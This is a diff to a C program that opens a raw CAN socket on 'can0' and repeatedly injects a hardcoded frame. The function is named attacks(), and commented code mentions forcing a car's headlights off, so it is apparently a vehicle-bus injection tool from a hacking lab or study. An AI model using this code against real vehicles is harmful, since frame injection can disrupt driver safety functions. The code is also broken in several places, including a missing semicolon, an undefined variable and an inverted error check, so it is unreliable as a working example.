@@ -3,11 +3,10 @@
 #include <string.h>
 #include <unistd.h>
 
-#include <linux/ioctl.h>
-#include <linux/if_tun.h>
-#include <linux/can.h>
-#include <linux/can/raw.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
 
+#include <can.h>
 #include "lib.h"
 
 void attacks(void);
@@ -24,64 +23,64 @@ int send(char* buff, int &s){
 
 	/* parse buffer into can frame */
 	if (parse_canframe(buff, &frame)){
-		return 0;
+		perror("parse");
+		return 1;
 	}
 
-	/* send frame */
-	if ((nbytes = write(s, &frame, sizeof(frame))) != sizeof(frame)) {
-		perror("write");
-		return 0;
-	}
-	return 1;
+    if((nbytes = sendto(s, &frame, sizeof(struct can_frame),
+                    0, (struct sockaddr*)&addr, sizeof(addr)))){
+    	perror("write");
+    	return 1;
+    }
+
+    return 0;
 }
 
 void attacks(void){
-	printf("\n up/down for headlights, left/right for fan");
 	
-	int s; /* can raw socket */ 
+	int s; 
 	struct sockaddr_can addr;
-	struct can_frame frame;
 	struct ifreq ifr;
 
 	/* open socket */
 	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
-		perror("socket");
+		perror("can't open socket");
 		close(s);
 		exit(1);
 	}
 
-	addr.can_family = AF_CAN;
-
-	//strncpy(ifr.ifr_name, argv[1]);
+	strncpy(ifr.ifr_name, "can0", IFNAMSIZ - 1);
 	if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
 		perror("SIOCGIFINDEX");
 		close(s);
 		exit(1);
 	}
 	addr.can_ifindex = ifr.ifr_ifindex;
+	addr.can_family = AF_CAN;
 
-	/* disable default receive filter on this RAW socket */
-	/* This is obsolete as we do not read from the socket at all, but for */
-	/* this reason we can remove the receive list in the Kernel to save a */
-	/* little (really a very little!) CPU usage.                          */
 	setsockopt(s, SOL_CAN_RAW, CAN_RAW_FILTER, NULL, 0);
 
 	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-		perror("bind");
+		perror("can't bind socket");
 		close(s);
 		exit(1);
 	}
 
+	char* buf = "3BB#4000000000000000"
 	while(1)
 		{
-
+			if(send(buff, s)){
+				break;
 			}
+
+		}
 
 	close(s);
 }
 
 
 			/*
+			printf("\n up/down for headlights, left/right for fan");
 			if(down == 0){
 				//Force headlights off
 				while(1){
